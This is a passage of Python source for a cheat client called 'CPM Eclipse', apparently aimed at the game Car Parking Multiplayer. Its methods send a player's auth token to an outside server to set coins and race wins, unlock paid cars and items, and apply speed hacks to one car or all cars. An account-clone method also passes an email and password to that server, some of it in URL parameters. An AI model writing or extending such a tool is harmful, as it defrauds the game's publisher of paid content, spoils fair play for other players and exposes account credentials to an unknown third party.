        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_coins", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"⭐ CPM Eclipse: Coins set to {amount}!")
        return response_decoded.get("ok")

    def set_player_name(self, name) -> bool:
        """Set player name"""
        payload = {"account_auth": self.auth_token, "name": name}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_name", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👤 CPM Eclipse: Name changed to {name}!")
        return response_decoded.get("ok")

    def set_player_localid(self, id) -> bool:
        """Set player local ID"""
        payload = {"account_auth": self.auth_token, "id": id}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_id", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def get_player_car(self, car_id) -> any:
        """Get player car data"""
        payload = {"account_auth": self.auth_token, "car_id": car_id}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/get_car", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def delete_player_friends(self) -> bool:
        """Delete all friends"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/delete_friends", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👥 CPM Eclipse: All friends deleted!")
        return response_decoded.get("ok")

    def unlock_w16(self) -> bool:
        """Unlock W16 engine"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_w16", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🔧 CPM Eclipse: W16 Engine unlocked!")
        return response_decoded.get("ok")

    def unlock_horns(self) -> bool:
        """Unlock all horns"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_horns", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"📯 CPM Eclipse: All horns unlocked!")
        return response_decoded.get("ok")

    def disable_engine_damage(self) -> bool:
        """Disable engine damage"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/disable_damage", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🛡️ CPM Eclipse: Engine damage disabled!")
        return response_decoded.get("ok")

    def unlimited_fuel(self) -> bool:
        """Enable unlimited fuel"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlimited_fuel", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"⛽ CPM Eclipse: Unlimited fuel enabled!")
        return response_decoded.get("ok")

    def set_player_wins(self, amount) -> bool:
        """Set race wins"""
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_race_wins", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🏆 CPM Eclipse: Wins set to {amount}!")
        return response_decoded.get("ok")

    def set_player_loses(self, amount) -> bool:
        """Set race loses"""
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_race_loses", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"📉 CPM Eclipse: Loses set to {amount}!")
        return response_decoded.get("ok")

    def unlock_houses(self) -> bool:
        """Unlock all houses"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_houses", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🏠 CPM Eclipse: All houses unlocked!")
        return response_decoded.get("ok")

    def unlock_smoke(self) -> bool:
        """Unlock smoke effects"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_smoke", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"💨 CPM Eclipse: Smoke effects unlocked!")
        return response_decoded.get("ok")

    def unlock_all_lamborghinis(self) -> bool:
        """Unlock all Lamborghinis"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_all_lamborghinis", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🏎️ CPM Eclipse: All Lamborghinis unlocked!")
        return response_decoded.get("ok")

    def unlock_paid_cars(self) -> bool:
        """Unlock all paid cars"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_paid_cars", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🚗 CPM Eclipse: All paid cars unlocked!")
        return response_decoded.get("ok")

    def unlock_all_cars(self) -> bool:
        """Unlock all cars"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_all_cars", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🚗 CPM Eclipse: ALL CARS UNLOCKED! 🔓")
        return response_decoded.get("ok")

    def unlock_all_cars_siren(self) -> bool:
        """Unlock all cars with sirens"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_all_cars_siren", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🚨 CPM Eclipse: All cars with sirens unlocked!")
        return response_decoded.get("ok")

    def account_clone(self, account_email, account_password) -> bool:
        """Clone account"""
        payload = {
            "account_auth": self.auth_token,
            "account_email": account_email,
            "account_password": account_password,
        }
        params = {
            "key": self.access_key,
            "account_email": account_email,
            "account_password": account_password,
        }
        response = requests.post(
            f"{__ENDPOINT_URL__}/clone", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"📋 CPM Eclipse: Account cloned!")
        return response_decoded.get("ok")

    def set_player_plates(self) -> bool:
        """Set player plates"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_plates", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"📋 CPM Eclipse: Plates set!")
        return response_decoded.get("ok")

    def unlock_wheels(self) -> bool:
        """Unlock all wheels"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_wheels", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🔄 CPM Eclipse: All wheels unlocked!")
        return response_decoded.get("ok")

    def unlock_equipments_male(self) -> bool:
        """Unlock male equipment"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_equipments_male", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👔 CPM Eclipse: Male equipment unlocked!")
        return response_decoded.get("ok")

    def unlock_hat_m(self) -> bool:
        """Unlock male hats"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_hat_m", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🎩 CPM Eclipse: Male hats unlocked!")
        return response_decoded.get("ok")

    def rmhm(self) -> bool:
        """Remove male hat? (Unknown function)"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/rmhm", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_topm(self) -> bool:
        """Unlock male tops"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topm", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👕 CPM Eclipse: Male tops unlocked!")
        return response_decoded.get("ok")

    def unlock_topmz(self) -> bool:
        """Unlock male tops (variant)"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topmz", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👕 CPM Eclipse: Male tops (Z) unlocked!")
        return response_decoded.get("ok")

    def unlock_topmx(self) -> bool:
        """Unlock male tops (variant)"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topmx", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👕 CPM Eclipse: Male tops (X) unlocked!")
        return response_decoded.get("ok")

    def unlock_equipments_female(self) -> bool:
        """Unlock female equipment"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_equipments_female", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👗 CPM Eclipse: Female equipment unlocked!")
        return response_decoded.get("ok")

    def rmhfm(self) -> bool:
        """Remove female hat? (Unknown function)"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/rmhfm", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_topf(self) -> bool:
        """Unlock female tops"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topf", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👗 CPM Eclipse: Female tops unlocked!")
        return response_decoded.get("ok")

    def unlock_topfz(self) -> bool:
        """Unlock female tops (variant)"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topfz", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👗 CPM Eclipse: Female tops (Z) unlocked!")
        return response_decoded.get("ok")

    def hack_car_speed(self, car_id, new_hp, new_inner_hp, new_nm, new_torque):
        """Hack car speed parameters"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "new_hp": new_hp,
            "new_inner_hp": new_inner_hp,
            "new_nm": new_nm,
            "new_torque": new_torque,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/hack_car_speed", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"⚡ CPM Eclipse: Car {car_id} speed hacked!")
        return response_decoded.get("ok")

    def unlock_animations(self) -> bool:
        """Unlock all animations"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_animations", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🎬 CPM Eclipse: All animations unlocked!")
        return response_decoded.get("ok")

    def max_max1(self, car_id, custom):
        """Max car stats (version 1)"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/max_max1", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"📈 CPM Eclipse: Car {car_id} maxed (v1)!")
        return response_decoded.get("ok")

    def max_max2(self, car_id, custom):
        """Max car stats (version 2)"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/max_max2", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"📈 CPM Eclipse: Car {car_id} maxed (v2)!")
        return response_decoded.get("ok")

    def millage_car(self, car_id, custom):
        """Set car mileage"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/millage_car", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"📊 CPM Eclipse: Car {car_id} mileage set!")
        return response_decoded.get("ok")

    def brake_car(self, car_id, custom):
        """Set car brake settings"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/brake_car", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🛑 CPM Eclipse: Car {car_id} brakes set!")
        return response_decoded.get("ok")

    def unlock_crown(self) -> bool:
        """Unlock crown"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_crown", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"👑 CPM Eclipse: Crown unlocked!")
        return response_decoded.get("ok")

    def unlock_cls(self) -> bool:
        """Unlock CLS"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_cls", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🚗 CPM Eclipse: CLS unlocked!")
        return response_decoded.get("ok")

    def rear_bumper(self, car_id):
        """Set rear bumper"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/rear_bumper", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🔧 CPM Eclipse: Rear bumper set for car {car_id}!")
        return response_decoded.get("ok")

    def front_bumper(self, car_id):
        """Set front bumper"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/front_bumper", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🔧 CPM Eclipse: Front bumper set for car {car_id}!")
        return response_decoded.get("ok")

    def testin(self, custom):
        """Test function (unknown)"""
        payload = {
            "account_auth": self.auth_token,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/testin", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def telmunnongodz(self, car_id, custom):
        """Unknown function"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/telmunnongodz", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def speed_all_cars(self, new_hp, new_inner_hp, new_nm, new_torque):
        """Apply speed hack to all cars"""
        payload = {
            "account_auth": self.auth_token,
            "new_hp": new_hp,
            "new_inner_hp": new_inner_hp,
            "new_nm": new_nm,
            "new_torque": new_torque,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/speed_all_cars", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"⚡ CPM Eclipse: Speed hack applied to ALL cars!")
        return response_decoded.get("ok")

    def shittin(self) -> bool:
        """Unknown function"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(f"{__ENDPOINT_URL__}/shittin", params=params, data=payload)
        response_decoded = response.json()
        return response_decoded.get("ok")

    def incline(self, car_id, custom):
        """Set car incline"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/incline", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"📐 CPM Eclipse: Car {car_id} incline set!")
        return response_decoded.get("ok")

    def copy_livery(self, source_car_id, target_car_id):
        """Copy livery from one car to another"""
        payload = {
            "account_auth": self.auth_token,
            "source_car_id": source_car_id,
            "target_car_id": target_car_id,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/copy_livery", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🎨 CPM Eclipse: Livery copied from {source_car_id} to {target_car_id}!")
        return response_decoded.get("ok")

    def modificar_todos_los_autos(
        self, new_hp, new_inner_hp, new_nm, new_torque
    ) -> bool:
        """Modify ALL cars with speed hack"""
        with open("car_ids.json", "r") as file:
            car_ids = json.load(file)

        def modificar_auto(car_id):
            payload = {
                "account_auth": self.auth_token,
                "car_id": car_id,
                "new_hp": new_hp,
                "new_inner_hp": new_inner_hp,
                "new_nm": new_nm,
                "new_torque": new_torque,
            }
            params = {"key": self.access_key}
            try:
                response = requests.post(
                    f"{__ENDPOINT_URL__}/speed_all_cars",
                    params=params,
                    data=payload,
                    timeout=3,
                )
                return response.json().get("ok", False)
            except:
                return False

        print(f"⚡ CPM Eclipse: Modifying ALL cars...")
        with ThreadPoolExecutor(max_workers=20) as executor:
            list(executor.map(modificar_auto, car_ids))
        print(f"✅ CPM Eclipse: ALL cars modified successfully!")
        return True
